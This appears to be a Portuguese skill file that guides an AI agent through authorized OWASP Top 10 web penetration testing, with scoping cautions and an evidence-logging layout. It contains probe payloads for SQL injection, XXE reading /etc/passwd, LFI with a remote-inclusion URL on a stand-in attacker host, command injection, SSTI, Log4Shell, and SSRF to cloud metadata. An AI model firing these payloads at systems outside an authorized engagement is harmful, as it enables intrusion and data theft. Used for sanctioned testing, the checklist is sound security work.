---
name: owasp-web-testing
description: Use para aplicar testes sistemáticos de vulnerabilidades web conforme o OWASP Top 10 (2021) após o reconhecimento: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection (SQLi, XSS, SSRF, XXE, LFI/RFI, RCE, SSTI), A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable and Outdated Components, A07 Identification and Authentication Failures, A08 Software and Data Integrity Failures, A09 Security Logging and Monitoring Failures, A10 SSRF. Palavras-chave: sqlmap, sql injection, xss, ssrf, xxe, lfi, rfi, ssti, idor, csrf, upload, deserialização, vulnerability testing.
---

# Testes de Vulnerabilidades Web (OWASP Top 10)

Testar sistematicamente cada categoria OWASP e registrar evidências por achado. Sempre precedido pela skill `recon` e, se houver WAF, usar os bypasses validados da skill `waf-analysis`.

## Linha de base
- Antes de testar, capture requests legítimos (GET/POST autenticados) que servirão de controle para comparar respostas.
- Registre tempo de resposta médio e status codes para diferenciar comportamentos.
- Use ambientes controlados (lab/staging) sempre que possível.

## A01 — Broken Access Control
- **IDOR/BOLA**: trocar IDs de objetos (`/users/1001`, `/orders/12`) em rotas autenticadas e verificar se outro usuário acessa dados alheios.
- **BOPLA/BOPA**: alterar campos de objeto/action (`role=admin`, `status: "paid"`), forçar métodos (`PUT/PATCH/DELETE`), acesso direto a funções administrativas.
- **Path traversal / forced browsing**: acessar `/admin`, `/backup`, `/debug`, arquivos de config diretamente.
- **Privilege escalation**: subir um usuário padrão para admin, usar token de outro usuário, listar todos os recursos.

## A02 — Cryptographic Failures
- Verificar transporte: HTTP para HTTPs (redirecionamento), cripto fraca (TLS 1.0/1.1, SSL), falha de HSTS.
- Sensitive data em trânsito/repo: senhas em logs, tokens em URL, PII em respostas de erro, headers de cache (`Cache-Control: public`).
- Cripto do lado do servidor: hashes fracos (MD5/SHA1), IDs previsíveis/enumeráveis, IV reutilizado, JWT com `alg: none` ou HMAC fraco.

## A03 — Injection
- **SQLi**: testar em todos os parâmetros com `'`, `"`, `--`, `;`, payloads boolean/time/error/UNION.
  - Detecção: diferença de resposta (error SQL, comportamento lógico, timing).
  - Tooling: `sqlmap -u URL --batch --risk=2 --level=3` (respeitando escopo; usar `--flush-session` entre runs). Extrair apenas dados mínimos (ver skill `exploitation`).
- **XXE**: testar `Content-Type: application/xml` com DTD externo (`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`), entidades externas em SOAP, OASIS-Open XML.
- **LFI/RFI**: path traversal (`../../etc/passwd`), wrappers PHP (`php://filter/convert.base64-encode/resource=index.php`), inclusão remota (`http://attacker/rce.txt`).
- **RCE / Command Injection**: payloads `;id`, `|whoami`, `$(id)`, `%60id%60`, backticks em parâmetros que alimentam comandos de sistema.
- **SSTI / Template Injection**: payloads `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` em engines (Jinja2, Twig, Freemarker, Velocity, Thymeleaf).
- **Insecure Deserialization**: payloads de Java (`ysoserial`), Python pickle, PHP `unserialize` — somente se evidenciar impacto sem dano.

## A04 — Insecure Design
- Analisar lógica de negócio: fluxo de pagamento, limites de tentativa, verificação de etapa, reuso de tokens, manipulação de preço/quantidade.
- Defaults inseguros: credenciais padrão, portas administrativas expostas, documentação interna acessível.

## A05 — Security Misconfiguration
- Headers de segurança ausentes (ver skill `recon` item 6), `TRACE`/`OPTIONS` permitidos, directory listing, painéis sem auth, debug mode, verbose errors com stack traces/versões, CORS permissivo.

## A06 — Vulnerable and Outdated Components
- Fingerprint de versões (recon) e cruzamento com CVEs (searchsploit, NVD).
- Detectar componentes comuns: jQuery antigo, frameworks EOL, Log4Shell (payload `\${jndi:ldap://...}` — apenas para confirmação controlada).

## A07 — Identification and Authentication Failures
- Credenciais fracas/padrão, ausência de rate limit/MFA, brute force (autorizado e respeitando limites), enumeração de usuários (mensagens de erro diferenciadas), session fixation/regeneração, cookie inseguro, reset de senha previsível, JWT inválido/fraca.

## A08 — Software and Data Integrity Failures
- Dependências não assinadas (supply chain), atualizações automáticas sem verificação, desserialização (ver A03), dados de CI/CD expostos, `.git` exposto.

## A09 — Security Logging and Monitoring Failures
- Verificar ausência de logging de ações sensíveis (login, admin, delete), ausência de alertas/monitoração, logs sem IDs de sessão/usuário, detecção de scanning.

## A10 — SSRF
- Testar campos de URL (fetch, import, webhook, redirect, avatar, preview): `http://127.0.0.1:80`, `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://[::1]`, IP decimal/hex/octal, `http://localtest.me`, redirect via `http://169.254.169.254` para inside, DNS rebinding (se autorizado).
- Confirmar impacto acessando apenas o necessário (não exfiltrar secrets, ver skill `exploitation`).

## Evidência por achado
Para cada vulnerabilidade confirmada, salve em `findings/`:
```
findings/
├── F-001-<nome>.md    (título, categoria OWASP, request completo, response relevante, severidade inicial)
└── payloads-F-001.txt (payloads testados, um por linha)
```
Complete as evidências com hashes SHA256 dos payloads críticos e timestamps. A severidade final, PoC e correção entram na skill `reporting`.